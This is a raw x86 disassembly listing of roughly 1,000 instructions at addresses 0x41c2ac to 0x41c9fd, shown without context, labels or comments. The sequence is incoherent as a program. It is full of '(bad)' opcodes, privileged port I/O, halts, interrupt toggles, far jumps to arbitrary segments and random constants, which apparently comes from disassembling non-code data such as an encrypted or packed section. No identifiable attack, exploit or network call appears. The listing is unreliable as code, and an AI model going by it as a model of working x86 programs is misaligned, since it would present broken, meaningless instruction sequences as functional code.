  41c2ac:	bnd jp 0x41c267
  41c2af:	pop    edx
  41c2b0:	adc    ebp,DWORD PTR cs:[edi]
  41c2b3:	call   0x63a644e
  41c2b8:	outs   dx,DWORD PTR ds:[esi]
  41c2b9:	xor    ecx,esp
  41c2bb:	sti    
  41c2bc:	lds    eax,FWORD PTR [ecx]
  41c2be:	push   es
  41c2bf:	gs test ebx,0xee810e9c
  41c2c6:	shr    cl,cl
  41c2c8:	cmp    DWORD PTR [ebp+0x762ebebd],edi
  41c2ce:	fcompp 
  41c2d0:	aaa    
  41c2d1:	test   al,0x62
  41c2d3:	mov    eax,0xa0f0ed26
  41c2d8:	out    dx,eax
  41c2d9:	in     al,0x90
  41c2db:	(bad)  
  41c2dc:	hlt    
  41c2dd:	jnp    0x41c2dc
  41c2df:	imul   esi,DWORD PTR [edi],0x37
  41c2e2:	xchg   ebx,eax
  41c2e3:	pop    esi
  41c2e4:	in     eax,0x15
  41c2e6:	ins    DWORD PTR es:[edi],dx
  41c2e7:	imul   ecx,DWORD PTR [ebp-0x673a6f82],0xfffffff9
  41c2ee:	sti    
  41c2ef:	es mov bh,0xd
  41c2f2:	out    0xc2,eax
  41c2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2f5:	pop    edx
  41c2f6:	dec    ebx
  41c2f7:	push   edx
  41c2f8:	mov    ch,0x2c
  41c2fa:	sub    ecx,ebp
  41c2fc:	jle    0x41c309
  41c2fe:	sub    dh,dh
  41c300:	push   cs
  41c301:	je     0x41c36d
  41c303:	inc    edi
  41c304:	lock or edi,DWORD PTR [esi+0x53]
  41c308:	scas   al,BYTE PTR es:[edi]
  41c309:	daa    
  41c30a:	ss jl  0x41c2a7
  41c30d:	enter  0xedc,0xd9
  41c311:	fdivr  QWORD PTR [edx-0x51]
  41c314:	aad    0x85
  41c316:	test   eax,0x1d97e993
  41c31b:	mov    ds:0x797acf76,al
  41c320:	fwait
  41c321:	hlt    
  41c322:	mov    bl,0x55
  41c324:	push   ebx
  41c325:	dec    eax
  41c326:	mov    ebx,0xa4a27b53
  41c32b:	xchg   ecx,eax
  41c32c:	mov    ah,0xf8
  41c32e:	js     0x41c3a2
  41c330:	nop
  41c331:	sub    dh,cl
  41c333:	scas   eax,DWORD PTR es:[edi]
  41c334:	mov    ecx,0xb0552c13
  41c339:	(bad)  
  41c33a:	pop    ss
  41c33b:	daa    
  41c33c:	jbe    0x41c2c7
  41c33e:	push   esp
  41c33f:	stos   BYTE PTR es:[edi],al
  41c340:	scas   eax,DWORD PTR es:[edi]
  41c341:	lods   eax,DWORD PTR ds:[esi]
  41c342:	ins    BYTE PTR es:[edi],dx
  41c343:	cmp    bh,BYTE PTR [edx]
  41c345:	sub    DWORD PTR [ecx],eax
  41c347:	in     eax,dx
  41c348:	sub    al,0xf8
  41c34a:	pop    esi
  41c34b:	jg     0x41c33a
  41c34d:	jle    0x41c2d4
  41c34f:	xor    eax,0xe67a2e44
  41c354:	pop    es
  41c355:	aaa    
  41c356:	lahf   
  41c357:	into   
  41c358:	enter  0x6f4b,0x3
  41c35c:	popf   
  41c35d:	push   esp
  41c35e:	or     dh,BYTE PTR [ecx+0xa947998]
  41c364:	lock mov BYTE PTR [ebp+0x1b],dl
  41c368:	pop    edi
  41c369:	test   DWORD PTR [edi+0x1960748b],ebp
  41c36f:	xlat   BYTE PTR ds:[ebx]
  41c370:	fist   WORD PTR [esi+0x436c259c]
  41c376:	mov    DWORD PTR [edx+0xe],edi
  41c379:	inc    esi
  41c37a:	xor    ah,bl
  41c37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c37d:	aaa    
  41c37e:	mov    ecx,0x8e6f861a
  41c383:	xchg   esp,eax
  41c384:	xlat   BYTE PTR ds:[ebx]
  41c385:	dec    edx
  41c386:	and    al,0xc9
  41c388:	sub    al,0x77
  41c38a:	cmp    al,0x4b
  41c38c:	pushf  
  41c38d:	int    0x5e
  41c38f:	ret    0xf7ba
  41c392:	mov    eax,0xb6d70176
  41c397:	jp     0x41c3ef
  41c399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39a:	push   ss
  41c39b:	sti    
  41c39c:	adc    ch,BYTE PTR [ebp-0x41]
  41c39f:	jmp    0x8940:0xbf90496b
  41c3a6:	pop    ecx
  41c3a7:	ss imul ebx,esp,0x78
  41c3ab:	jnp    0x41c3e0
  41c3ad:	sub    DWORD PTR [eax-0x1f977d9a],0xffffffeb
  41c3b4:	mov    ds:0xcc489062,al
  41c3b9:	mov    bl,0x51
  41c3bb:	sub    DWORD PTR [ebx],0xd
  41c3be:	repz aas 
  41c3c0:	push   ecx
  41c3c1:	xchg   edx,eax
  41c3c2:	(bad)  ds:0x73d77b21
  41c3c8:	data16 stos BYTE PTR es:[edi],al
  41c3ca:	push   esi
  41c3cb:	and    eax,0x767a9fbf
  41c3d0:	pop    ds
  41c3d1:	and    BYTE PTR [ecx+0x47bea637],dl
  41c3d7:	ja     0x41c42c
  41c3d9:	push   ebp
  41c3da:	ins    BYTE PTR es:[edi],dx
  41c3db:	mov    ebx,0x11e77cb2
  41c3e0:	sub    DWORD PTR [eax],0x39
  41c3e3:	pop    es
  41c3e4:	fcom   QWORD PTR [ebp+0x14cfd5d8]
  41c3ea:	scas   al,BYTE PTR es:[edi]
  41c3eb:	imul   ebx,DWORD PTR [edx-0x2b],0x6ce836c8
  41c3f2:	and    edx,ecx
  41c3f4:	aas    
  41c3f5:	add    eax,0x2a98941e
  41c3fa:	inc    esi
  41c3fb:	xchg   cx,ax
  41c3fd:	imul   esi,DWORD PTR [edi+0x63752a87],0x7f
  41c404:	or     al,0x67
  41c406:	xchg   BYTE PTR [ecx],cl
  41c408:	pop    edi
  41c409:	xchg   edi,eax
  41c40a:	dec    eax
  41c40b:	leave  
  41c40c:	out    0x10,al
  41c40e:	pop    edx
  41c40f:	add    ah,BYTE PTR [esi]
  41c411:	sub    DWORD PTR [esi],0x1b
  41c414:	or     bl,BYTE PTR [ecx+edx*8+0x4e]
  41c418:	sar    BYTE PTR [edx],0xdb
  41c41b:	nop
  41c41c:	iret   
  41c41d:	sti    
  41c41e:	cmp    DWORD PTR [ebx],edx
  41c420:	pop    edi
  41c421:	push   esp
  41c422:	cmp    BYTE PTR [ebx+0xc],dh
  41c425:	or     al,0x27
  41c427:	or     dh,cl
  41c429:	dec    ebx
  41c42a:	sub    cl,dl
  41c42c:	sbb    eax,0x8d9b0e68
  41c431:	sar    DWORD PTR [ebx],1
  41c433:	mov    bl,0x9a
  41c435:	adc    DWORD PTR [eax],edx
  41c437:	es ret 
  41c439:	xchg   ecx,eax
  41c43a:	mov    ebx,0x3d302be2
  41c43f:	adc    al,0x8e
  41c441:	mov    al,ds:0xe6f5994f
  41c446:	imul   edx,eax,0x4a
  41c449:	xchg   edi,eax
  41c44a:	add    eax,0x1248179a
  41c44f:	in     eax,dx
  41c450:	fcmovbe st,st(7)
  41c452:	(bad)  
  41c454:	push   ebp
  41c455:	jo     0x41c4ab
  41c457:	cli    
  41c458:	add    edx,DWORD PTR [ebx+0x1db7647]
  41c45e:	retf   0xaf77
  41c461:	pop    edi
  41c462:	cs and al,0x84
  41c465:	(bad)  
  41c466:	jmp    0x264b592d
  41c46b:	ins    BYTE PTR es:[edi],dx
  41c46c:	aam    0x26
  41c46e:	jg     0x41c494
  41c470:	fmulp  st(1),st
  41c472:	aad    0x78
  41c474:	retf   
  41c475:	imul   ecx,DWORD PTR [edx-0x22fc218b],0xcd45577a
  41c47f:	loop   0x41c46f
  41c481:	fist   DWORD PTR [edx+0x65]
  41c484:	dec    BYTE PTR [eax-0x2afef30e]
  41c48a:	ss xor BYTE PTR fs:[esi-0x65865625],bl
  41c492:	sti    
  41c493:	mov    dh,0x9
  41c495:	retf   
  41c496:	(bad)  [esi-0x3f]
  41c499:	lds    esi,FWORD PTR [edi]
  41c49b:	outs   dx,DWORD PTR ds:[esi]
  41c49c:	out    0x67,eax
  41c49e:	call   0xc53fa5dd
  41c4a3:	cdq    
  41c4a4:	mov    ch,0x87
  41c4a6:	pop    edi
  41c4a7:	nop
  41c4a8:	sub    ch,dl
  41c4aa:	stc    
  41c4ab:	in     al,0xdd
  41c4ad:	pusha  
  41c4ae:	jno    0x41c4c0
  41c4b0:	sbb    ebx,ebp
  41c4b2:	popa   
  41c4b3:	mov    esp,0x50858681
  41c4b8:	imul   esi,DWORD PTR [ebx-0x6f],0x2a
  41c4bc:	add    ebp,DWORD PTR [ebx+esi*8-0x16]
  41c4c0:	and    eax,0xd047be92
  41c4c5:	adc    bl,BYTE PTR ds:[edx-0x4a587a30]
  41c4cc:	adc    cl,cl
  41c4ce:	sbb    ch,bh
  41c4d0:	cmc    
  41c4d1:	and    BYTE PTR [esi*2+0x2472a0ef],0x52
  41c4d9:	(bad)  
  41c4db:	push   ss
  41c4dc:	jmp    0x59f69d7c
  41c4e1:	adc    al,0x19
  41c4e3:	aad    0xb7
  41c4e5:	sbb    eax,0x193f380b
  41c4ea:	imul   BYTE PTR [edi]
  41c4ec:	mov    WORD PTR [eax-0x6a8c39a],ds
  41c4f2:	push   esp
  41c4f3:	mov    ebp,DWORD PTR [esp+ecx*4+0x709104d3]
  41c4fa:	ret    0xcb88
  41c4fd:	sbb    eax,0x31f90037
  41c502:	mov    bl,0xf2
  41c504:	ins    BYTE PTR es:[edi],dx
  41c505:	inc    esp
  41c506:	and    al,0x2a
  41c508:	test   DWORD PTR [ebx],0x3772e3df
  41c50e:	adc    ch,BYTE PTR [esp+eiz*2+0x36c77cd3]
  41c515:	stc    
  41c516:	(bad)  
  41c517:	(bad)  
  41c519:	xor    BYTE PTR ds:0xf1d28436,bh
  41c51f:	mov    dl,BYTE PTR [edx-0x32aa893]
  41c525:	mov    edx,0xaa6d0ff
  41c52a:	sbb    dh,BYTE PTR [edi+0x27]
  41c52d:	sub    ebp,DWORD PTR [eax+0x76]
  41c530:	rcl    DWORD PTR [esi+0x7c04e4e9],0x4f
  41c537:	mov    esp,0x232df11f
  41c53c:	or     ch,BYTE PTR [esi]
  41c53e:	stc    
  41c53f:	out    0x3a,eax
  41c541:	sbb    BYTE PTR [edi],ch
  41c543:	inc    edi
  41c544:	aam    0x63
  41c546:	lea    edi,[ebx+0x61]
  41c549:	test   al,0x1b
  41c54b:	push   esp
  41c54c:	push   ebp
  41c54d:	lahf   
  41c54e:	push   ss
  41c54f:	jno    0x41c5a0
  41c551:	mov    dl,0xc5
  41c553:	cmp    eax,DWORD PTR [esi+0x70]
  41c556:	add    ch,cl
  41c558:	inc    eax
  41c559:	lock adc eax,0xab45747e
  41c55f:	push   esp
  41c560:	ficomp WORD PTR [ebx-0x1928935c]
  41c566:	out    dx,al
  41c567:	cmp    al,0xcf
  41c569:	loope  0x41c5c9
  41c56b:	sbb    DWORD PTR [ebx-0x6e44289e],ecx
  41c571:	inc    esp
  41c572:	inc    esp
  41c573:	push   edi
  41c574:	mov    cs,WORD PTR [edx]
  41c576:	aaa    
  41c577:	enter  0xd81b,0x8b
  41c57b:	mov    eax,ds:0xad9c4e8a
  41c580:	xchg   edi,eax
  41c581:	std    
  41c582:	std    
  41c583:	lods   eax,DWORD PTR ds:[esi]
  41c584:	xor    eax,0xb9d6e85b
  41c589:	stc    
  41c58a:	and    esp,edi
  41c58c:	add    al,0x96
  41c58e:	push   ss
  41c58f:	jnp    0x41c5f7
  41c591:	into   
  41c592:	mov    ecx,0x45ac9184
  41c597:	fidivr DWORD PTR [edx+0x66]
  41c59a:	leave  
  41c59b:	inc    ebp
  41c59c:	fmul   st,st(2)
  41c59e:	mov    cl,0xc1
  41c5a0:	in     eax,0x85
  41c5a2:	inc    ebp
  41c5a3:	dec    ebx
  41c5a4:	mov    ebx,0xffcfcc42
  41c5a9:	(bad)  
  41c5ab:	shl    ah,0x53
  41c5ae:	das    
  41c5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5b0:	rcl    edx,1
  41c5b2:	jbe    0x41c596
  41c5b4:	sbb    ah,cl
  41c5b6:	inc    esp
  41c5b7:	cld    
  41c5b8:	push   cs
  41c5b9:	outs   dx,BYTE PTR ds:[esi]
  41c5ba:	lea    eax,[edx+0x1c]
  41c5bd:	xor    al,0xb9
  41c5bf:	mov    ?,WORD PTR [ebp-0x61806283]
  41c5c5:	pusha  
  41c5c6:	push   edi
  41c5c7:	inc    edi
  41c5c8:	retf   0x7305
  41c5cb:	adc    DWORD PTR [edi+eiz*2+0x44],edx
  41c5cf:	or     esi,ebp
  41c5d1:	inc    edx
  41c5d2:	mov    ?,WORD PTR [ecx]
  41c5d4:	inc    edi
  41c5d5:	fwait
  41c5d6:	mov    ecx,0xa51a6870
  41c5db:	inc    ebx
  41c5dc:	iret   
  41c5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5df:	dec    eax
  41c5e0:	fwait
  41c5e1:	addr16 mov ecx,0x7b50b934
  41c5e7:	mov    edi,0x88db5625
  41c5ec:	arpl   si,di
  41c5ee:	mov    cl,0xd4
  41c5f0:	ret    0x68
  41c5f3:	and    BYTE PTR [esi-0x4],0x16
  41c5f7:	xor    ebx,DWORD PTR [edx]
  41c5f9:	fcom   QWORD PTR [eax]
  41c5fb:	pop    edx
  41c5fc:	xchg   ebp,eax
  41c5fd:	dec    esp
  41c5fe:	sub    BYTE PTR [eax],cl
  41c600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c601:	(bad)  
  41c603:	mov    ecx,0x7c965867
  41c608:	cmp    DWORD PTR [ecx-0x10387223],esi
  41c60e:	ret    
  41c60f:	and    bh,ah
  41c611:	pop    ebx
  41c612:	xor    edi,DWORD PTR [ecx+edx*8]
  41c615:	test   al,0x75
  41c617:	push   esi
  41c618:	push   ebp
  41c619:	xor    ebp,DWORD PTR [edi]
  41c61b:	pop    ss
  41c61c:	aaa    
  41c61d:	push   es
  41c61e:	mov    al,ds:0x64565356
  41c623:	inc    edi
  41c624:	mov    bl,0xb5
  41c626:	xor    DWORD PTR ds:0xd5bf2af7,0x2d63d75f
  41c630:	cmp    bh,al
  41c632:	push   0x34
  41c634:	pusha  
  41c635:	mov    edi,0xe22f5232
  41c63a:	xchg   BYTE PTR [ecx],cl
  41c63c:	mov    ebp,0x32a4b9ec
  41c641:	or     eax,0xdc1e9c5f
  41c646:	add    BYTE PTR [ebp+0x45],cl
  41c649:	test   dh,cl
  41c64b:	xor    esp,ecx
  41c64d:	dec    edi
  41c64e:	jae    0x41c5ef
  41c650:	and    eax,0xc2570f7b
  41c655:	ds neg eax
  41c658:	dec    eax
  41c659:	inc    edi
  41c65a:	add    eax,esi
  41c65c:	test   BYTE PTR [eax+0x228a4665],dh
  41c662:	adc    eax,eax
  41c664:	jecxz  0x41c60d
  41c666:	add    DWORD PTR ds:[ebp+0x40],ebx
  41c66a:	push   0xffffffa6
  41c66c:	ss adc eax,0x92be7594
  41c672:	pop    ecx
  41c673:	cdq    
  41c674:	mov    eax,ds:0x27122eeb
  41c679:	repz pop edx
  41c67b:	sbb    al,0x3e
  41c67d:	mov    bh,0x91
  41c67f:	fidivr WORD PTR [edx+0x2cfda50b]
  41c685:	outs   dx,BYTE PTR ds:[esi]
  41c686:	pop    esi
  41c687:	pop    ebx
  41c688:	mov    al,0x3e
  41c68a:	push   es
  41c68b:	mov    bh,0x4
  41c68d:	or     BYTE PTR [esi],bh
  41c68f:	aam    0x12
  41c691:	fisttp DWORD PTR [ebx-0x30dbd0e9]
  41c697:	mov    al,ds:0xac9d3e96
  41c69c:	fbld   TBYTE PTR [ecx-0x7f4a4771]
  41c6a2:	dec    ebx
  41c6a3:	xor    eax,0xc05363a8
  41c6a8:	push   ds
  41c6a9:	cmp    esp,DWORD PTR [ecx+0x94f1737]
  41c6af:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41c6b1:	inc    eax
  41c6b2:	pushf  
  41c6b3:	aad    0x20
  41c6b5:	add    al,BYTE PTR [ebx]
  41c6b7:	pop    ss
  41c6b8:	pop    esp
  41c6b9:	mov    al,0x40
  41c6bb:	mov    ds:0x3843bc6b,al
  41c6c0:	pop    ds
  41c6c1:	sbb    al,0x4e
  41c6c3:	call   0xef06:0x82feb1ad
  41c6ca:	fwait
  41c6cb:	retf   
  41c6cc:	test   ebx,ecx
  41c6ce:	out    0xf1,al
  41c6d0:	jnp    0x41c686
  41c6d2:	jne    0x41c6d5
  41c6d4:	jne    0x41c711
  41c6d6:	idiv   BYTE PTR [ebx+0x525d70a2]
  41c6dc:	xchg   edx,eax
  41c6dd:	jl     0x41c6b2
  41c6df:	in     eax,0x2c
  41c6e1:	pop    ss
  41c6e2:	stc    
  41c6e3:	add    BYTE PTR [esi],0x31
  41c6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6e7:	and    dh,BYTE PTR [ebx+0x66]
  41c6ea:	mov    cs,WORD PTR ds:[esi]
  41c6ed:	push   cs
  41c6ee:	stos   BYTE PTR es:[edi],al
  41c6ef:	ja     0x41c762
  41c6f1:	pop    esi
  41c6f2:	(bad)  
  41c6f3:	cmp    eax,0x1ec22571
  41c6f8:	lods   al,BYTE PTR ds:[esi]
  41c6f9:	sub    al,0xb2
  41c6fb:	xchg   ecx,eax
  41c6fc:	xchg   ecx,eax
  41c6fd:	jbe    0x41c6cf
  41c6ff:	jno    0x41c76b
  41c701:	and    dh,BYTE PTR [ebp+0x5b]
  41c704:	xchg   esp,eax
  41c705:	cld    
  41c706:	mov    cs,WORD PTR [edx-0x7f]
  41c709:	das    
  41c70a:	into   
  41c70b:	loopne 0x41c6b7
  41c70d:	daa    
  41c70e:	rcr    DWORD PTR [ecx-0x23],1
  41c711:	fst    DWORD PTR [ecx+0x6c]
  41c714:	inc    ecx
  41c715:	jle    0x41c759
  41c717:	adc    DWORD PTR [ecx+eax*2+0x7db25a69],ecx
  41c71e:	enter  0x20d2,0x2a
  41c722:	test   eax,0x5e5466f5
  41c727:	in     eax,0xcd
  41c729:	and    cl,dl
  41c72b:	arpl   WORD PTR [ebx+0x74],si
  41c72e:	inc    esp
  41c72f:	repz xor ecx,DWORD PTR ss:[edi-0x6d]
  41c734:	fimul  WORD PTR [edi-0x56]
  41c737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c738:	pop    edx
  41c739:	lea    ebx,[esi+0x2f]
  41c73c:	add    eax,0xd292dcaf
  41c741:	cmp    dl,al
  41c743:	cli    
  41c744:	xor    bh,bh
  41c746:	nop
  41c747:	mov    ecx,0x56de4208
  41c74c:	adc    al,0x6f
  41c74e:	scas   al,BYTE PTR es:[edi]
  41c74f:	fist   WORD PTR [eax-0x6f4d6c4a]
  41c755:	push   esp
  41c756:	adc    bl,bh
  41c758:	mov    DWORD PTR [ebp-0x52],ecx
  41c75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c75c:	(bad)  
  41c75d:	outs   dx,BYTE PTR ds:[esi]
  41c75e:	push   edx
  41c75f:	push   esi
  41c760:	sti    
  41c761:	jge    0x41c7c9
  41c763:	pusha  
  41c764:	popa   
  41c765:	add    esp,DWORD PTR [esi+0x4351c261]
  41c76b:	cmp    ebx,DWORD PTR [ebx]
  41c76d:	xchg   esi,eax
  41c76e:	mov    ch,0xf3
  41c770:	shl    ebx,1
  41c772:	mov    esp,0x32812f9b
  41c777:	scas   al,BYTE PTR es:[edi]
  41c778:	in     al,0x9d
  41c77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c77b:	xchg   esi,eax
  41c77c:	dec    esi
  41c77d:	js     0x41c73a
  41c77f:	xor    DWORD PTR [edi-0x1f],edi
  41c782:	jmp    0x1abc2fb4
  41c787:	inc    ecx
  41c788:	jnp    0x41c7f4
  41c78a:	test   al,0xab
  41c78c:	mov    eax,0x2ed04d5
  41c791:	inc    ebx
  41c792:	pop    ds
  41c793:	inc    esp
  41c794:	out    dx,al
  41c795:	push   0xffffff80
  41c797:	test   ecx,ecx
  41c799:	fs xchg ebx,eax
  41c79b:	push   0xffffffa5
  41c79d:	jg     0x41c78f
  41c79f:	push   ecx
  41c7a0:	sub    ch,0x21
  41c7a3:	lods   al,BYTE PTR fs:[esi]
  41c7a5:	ins    DWORD PTR es:[edi],dx
  41c7a6:	addr16 nop
  41c7a8:	inc    esi
  41c7a9:	imul   edx,DWORD PTR [ebp+0x71ce4117],0x72d3bf58
  41c7b3:	ror    DWORD PTR [esi-0x58d82aa7],cl
  41c7b9:	mov    ds:0x663d1715,eax
  41c7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7bf:	repz fcomp QWORD PTR [esi-0x42f6236a]
  41c7c6:	pop    ss
  41c7c7:	into   
  41c7c8:	jecxz  0x41c7ac
  41c7ca:	push   esi
  41c7cb:	addr16 (bad) 
  41c7cd:	out    dx,eax
  41c7ce:	aaa    
  41c7cf:	adc    ebx,DWORD PTR [esi-0x1b]
  41c7d2:	dec    ebx
  41c7d3:	(bad)  
  41c7d4:	out    dx,al
  41c7d5:	leave  
  41c7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7d7:	mov    cl,0xce
  41c7d9:	test   bl,dl
  41c7db:	pop    edx
  41c7dc:	dec    edi
  41c7dd:	repz xchg dx,ax
  41c7e0:	ret    0xee1e
  41c7e3:	mov    ebx,0x51266702
  41c7e8:	push   0xffffff8f
  41c7ea:	push   ecx
  41c7eb:	popa   
  41c7ec:	(bad)  
  41c7ed:	xchg   ecx,eax
  41c7ee:	push   cs
  41c7ef:	inc    esi
  41c7f0:	jne    0x41c845
  41c7f2:	jmp    DWORD PTR [edi*2-0x50b898cd]
  41c7f9:	lods   eax,DWORD PTR ds:[esi]
  41c7fa:	push   ebx
  41c7fb:	test   al,0xdc
  41c7fd:	cmp    eax,0x57e6c361
  41c802:	mov    bh,BYTE PTR [edx-0x1b61dcf7]
  41c808:	xor    eax,0x69fdf24e
  41c80d:	xor    bh,BYTE PTR [edi*8+0x1d37ee66]
  41c814:	es pop eax
  41c816:	xor    BYTE PTR [ebp-0x53],dh
  41c819:	push   eax
  41c81a:	xchg   BYTE PTR [ebx],dl
  41c81c:	mov    ds:0xc2a7d03b,al
  41c821:	popf   
  41c822:	int3   
  41c823:	mov    ds:0xa09e1a3d,eax
  41c828:	push   ss
  41c829:	mov    esi,0xded35d01
  41c82e:	mov    BYTE PTR [edx+0x44d11862],0xbf
  41c835:	xor    eax,0xad372836
  41c83a:	sbb    edi,DWORD PTR [ecx+0x46]
  41c83d:	push   esi
  41c83e:	int    0x2d
  41c840:	aad    0xac
  41c842:	add    BYTE PTR [esi+0x2c],ah
  41c845:	adc    esi,edx
  41c847:	xor    al,0xbe
  41c849:	cmp    DWORD PTR [edi],edi
  41c84b:	xchg   esp,eax
  41c84c:	cmp    eax,0x35d70b37
  41c851:	push   ds
  41c852:	test   DWORD PTR [ebp+0x6f],esp
  41c855:	jmp    0x9b70:0x11b0bd1d
  41c85c:	add    eax,0x939e18bf
  41c861:	es xchg ebx,eax
  41c863:	(bad)  
  41c864:	sahf   
  41c865:	push   0x2a
  41c867:	(bad)  
  41c868:	cmp    dh,bl
  41c86a:	aas    
  41c86b:	dec    edi
  41c86c:	mov    ch,0x36
  41c86e:	aaa    
  41c86f:	push   ss
  41c870:	and    DWORD PTR [edi+0x7b],0xffffffa2
  41c874:	or     BYTE PTR [esi],0xfb
  41c877:	cmp    eax,0x3a4d98d2
  41c87c:	xor    eax,0x929003e1
  41c881:	and    al,0x1b
  41c883:	cmc    
  41c884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c885:	sbb    al,0xbc
  41c887:	add    DWORD PTR fs:[edx-0x3d],edx
  41c88b:	fist   WORD PTR [ebx]
  41c88d:	daa    
  41c88e:	(bad)  
  41c88f:	iret   
  41c890:	xchg   esi,eax
  41c891:	aaa    
  41c892:	imul   ecx,edx,0x60f31909
  41c898:	sbb    DWORD PTR [edi-0x18],0xffffffc1
  41c89c:	inc    ecx
  41c89d:	cmp    al,dh
  41c89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8a0:	retf   
  41c8a1:	sbb    edi,DWORD PTR [edi]
  41c8a3:	jne    0x41c862
  41c8a5:	jb     0x41c834
  41c8a7:	aas    
  41c8a8:	(bad)  
  41c8a9:	mov    dh,0x13
  41c8ab:	mov    al,ds:0x2a856324
  41c8b0:	aas    
  41c8b1:	iret   
  41c8b2:	pusha  
  41c8b3:	xor    al,0x46
  41c8b5:	sub    DWORD PTR [eax-0x6d],0xb
  41c8b9:	xchg   ebp,eax
  41c8ba:	(bad)  
  41c8bb:	stos   BYTE PTR es:[edi],al
  41c8bc:	xchg   DWORD PTR [ebx-0x78],eax
  41c8bf:	ds call 0x518924ad
  41c8c5:	mov    esi,esp
  41c8c7:	adc    DWORD PTR [edi+0x3eda26cb],esi
  41c8cd:	xor    DWORD PTR [edi+eax*2+0x5a3eecb],esi
  41c8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d5:	pop    ecx
  41c8d6:	aad    0x2f
  41c8d8:	popf   
  41c8d9:	xor    al,0xdc
  41c8db:	icebp  
  41c8dc:	lods   al,BYTE PTR ds:[esi]
  41c8dd:	mov    edx,es
  41c8df:	cmp    al,0xcc
  41c8e1:	ins    DWORD PTR es:[edi],dx
  41c8e2:	mov    dl,cl
  41c8e4:	jo     0x41c8fa
  41c8e6:	mov    BYTE PTR [ebx-0x30],bh
  41c8e9:	fld    st(4)
  41c8eb:	xchg   esi,eax
  41c8ec:	sub    al,0x18
  41c8ee:	mov    ds:0xb343b635,eax
  41c8f3:	cli    
  41c8f4:	mov    cl,0xeb
  41c8f6:	iret   
  41c8f7:	ret    0x7066
  41c8fa:	sub    eax,0xea50c446
  41c8ff:	loopne 0x41c8f3
  41c901:	adc    al,0xf9
  41c903:	mov    ds:0x25f6ecbd,eax
  41c908:	mov    ch,cl
  41c90a:	xlat   BYTE PTR ds:[ebx]
  41c90b:	(bad)
  41c90e:	xor    al,0x3c
  41c910:	ss jp  0x41c967
  41c913:	jns    0x41c94d
  41c915:	in     eax,dx
  41c916:	adc    DWORD PTR [ecx+ebp*2+0x443223c5],eax
  41c91d:	div    DWORD PTR [ecx]
  41c91f:	and    DWORD PTR [ebx],ebx
  41c921:	jne    0x41c93c
  41c923:	jmp    0x61a6:0x715e4186
  41c92a:	je     0x41c952
  41c92c:	outs   dx,BYTE PTR ds:[esi]
  41c92d:	mov    al,ds:0x91c80d1
  41c932:	(bad)  
  41c933:	push   0x56
  41c935:	ins    BYTE PTR es:[edi],dx
  41c936:	xchg   bh,al
  41c938:	cld    
  41c939:	ffree  st(0)
  41c93b:	jae    0x41c911
  41c93d:	call   DWORD PTR [esi]
  41c93f:	in     al,0x55
  41c941:	xlat   BYTE PTR ds:[ebx]
  41c942:	ret    
  41c943:	and    al,0x46
  41c945:	sbb    BYTE PTR [esi+0x13],bl
  41c948:	xchg   BYTE PTR [ebx-0xd6bd43a],dl
  41c94e:	sub    al,0x76
  41c950:	test   eax,0xdbc1a341
  41c955:	and    BYTE PTR ds:0x8322dc6,ch
  41c95b:	dec    edx
  41c95c:	add    DWORD PTR [edi+0x47],ecx
  41c95f:	pop    edi
  41c960:	sub    eax,0xe0ce6dbe
  41c965:	pop    ecx
  41c966:	mov    cl,0xd6
  41c968:	loope  0x41c99c
  41c96a:	out    dx,eax
  41c96b:	inc    ecx
  41c96c:	icebp  
  41c96d:	stc    
  41c96e:	addr16 es (bad) 
  41c971:	(bad)  
  41c972:	(bad)  
  41c973:	(bad)  
  41c974:	pop    es
  41c975:	mov    ds:0xf0d56985,al
  41c97a:	cmp    eax,0x96af652b
  41c97f:	outs   dx,DWORD PTR ds:[esi]
  41c980:	xor    BYTE PTR [ebx],0x3a
  41c983:	imul   esp,DWORD PTR [ecx-0x20],0x32
  41c987:	(bad)  
  41c988:	sub    al,0xa2
  41c98a:	pushf  
  41c98b:	mov    al,ds:0x909e93e0
  41c990:	cmp    al,BYTE PTR [ecx-0x554ed5d7]
  41c996:	icebp  
  41c997:	jle    0x41c993
  41c999:	mov    bl,0xe9
  41c99b:	call   0xc7e54155
  41c9a0:	or     DWORD PTR [edx-0x7f9038c2],edi
  41c9a6:	mov    eax,ds:0x14cdbb1b
  41c9ab:	sbb    DWORD PTR [ebx+edx*4-0x25096f26],edi
  41c9b2:	cwde   
  41c9b3:	stos   BYTE PTR es:[edi],al
  41c9b4:	jns    0x41c994
  41c9b6:	pop    eax
  41c9b7:	inc    edx
  41c9b8:	lea    ebx,[edi-0x173be0d4]
  41c9be:	mov    DWORD PTR [eax],esp
  41c9c0:	jle    0x41c9a7
  41c9c2:	js     0x41c95e
  41c9c4:	add    DWORD PTR [ebp-0x6e4f9e2f],eax
  41c9ca:	neg    DWORD PTR [edi+0x15e5d51]
  41c9d0:	mov    edx,DWORD PTR [esi+0x5b]
  41c9d3:	inc    ecx
  41c9d4:	xlat   BYTE PTR ds:[ebx]
  41c9d5:	push   ebx
  41c9d6:	or     dh,BYTE PTR [esp+eiz*4+0x17e68dd6]
  41c9dd:	lods   al,BYTE PTR ds:[esi]
  41c9de:	in     eax,0x60
  41c9e0:	push   0x4e
  41c9e2:	or     ah,al
  41c9e4:	jecxz  0x41ca5a
  41c9e6:	adc    eax,0xd166d8da
  41c9eb:	test   al,0x7f
  41c9ed:	aad    0x16
  41c9ef:	jg     0x41ca45
  41c9f1:	not    DWORD PTR [ecx]
  41c9f3:	xor    al,0x94
  41c9f5:	push   ebx
  41c9f6:	push   es
  41c9f7:	adc    BYTE PTR [edi-0x66ef2bfb],dl
  41c9fd:	test   al,ah
